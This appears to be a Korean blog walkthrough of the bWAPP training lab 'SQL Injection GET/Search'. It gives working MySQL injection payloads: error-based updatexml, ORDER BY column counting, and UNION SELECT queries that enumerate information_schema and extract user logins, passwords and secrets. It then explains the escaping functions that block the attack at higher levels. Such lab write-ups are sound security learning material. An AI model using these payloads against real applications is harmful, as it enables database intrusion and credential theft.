---
layout: single
title: (bWAPP)SQL Injection GET/Search
categories: Web-vuln
tag: [sql injection, sql, injection, bwapp, bee box, GET, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 검증 로직
> Low Level 에서는 보안 대책이 적용되어 있지 않다.

## Level - Low

![그림 1-1](/assets/image/bwapp/sqli-get/image.png)
- 검색 기능이 존재하며, GET 방식으로 전송된다.
- ‘ (싱글쿼터) 입력을 통해 Error 유/무를 체크해보았다.

![그림 1-2](/assets/image/bwapp/sqli-get/image2.png)
- Error 가 발생되며 DBMS Error 가 페이지상에 노출되고 있다.
- MySQL 로 확인된다.

![그림 1-3](/assets/image/bwapp/sqli-get/image3.png)
- 연결 연산자를 통해 추가 확인을 했다.
- DBMS Error 가 노출되고 있으니 Error Based 공격을 수행했다.

```sql
' and updatexml(null,concat(0x3a,(select database())),null) and '%%'='%
```

> Bee-Box 에서는 updatexml 함수는 사용이 되지 않는다. (다른 환경에선는 정상 작동 함)

- 해당 Bee Box 에서는 Error Based 가 불가능 한 것으로 판단
- Union Based 공격을 수행

![그림 1-4](/assets/image/bwapp/sqli-get/image4.png)

- order by 7 결과 정상적인 출력 확인
- order by 8 결과 Error 발생 확인
- 총 컬럼의 개수는 7개로 확인됨

![그림 1-5](/assets/image/bwapp/sqli-get/image5.png)

```sql
%' union select 1,2,3,4,5,6,7--
```

- 출력 결과의 하단을 보게 되면, union select 결과로 2,3,5,4 총 4개의 출력 구간을 확인
- 출력 포지션을 확인 하였으니, 순차적으로 레코드를 출력 하였다.

```sql
'union select 1,schema_name,3,4,5,6,7 from information_schema.schemata--
```

```sql
'union select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema='bWAPP'--
```

```sql
'union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_schema='bWAPP' and table_name='users'--
```

![그림 1-6](/assets/image/bwapp/sqli-get/image6.png)

- 컬럼의 종류를 확인하였으니, 이제 확인 하고자 하는 컬럼의 데이터를 최종적으로 추출함.

```sql
'union select 1,concat(id,0x3a,login),concat(password,0x3a,secret),4,admin,6,7 from bWAPP.users-- 
```

![그림 1-7](/assets/image/bwapp/sqli-get/image7.png)
- 성공 적으로 Data를 획득 헀다.

## Medium & High

```php
function sqli_check_1($data)
{
    return addslashes($data)
}

function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

1. Medium Level 에서는 addslahes() 함수를 사용하여 ‘(싱글쿼터 )를 입력하게되면 \ 를 앞에 붙여 ‘(싱글쿼터) 사용을 막고 있다. 해당 search 구문인 ‘%%’ 로 이루어져 있어 공격이 성립되지 않는다.
2. High Level 에서는 mysql_real_escape_string() 함수를 사용하여 메타문자를 방지하고 있다.
3. 해당 문제에서 Medium 과 High Level은 공격이 성립되지 않는다.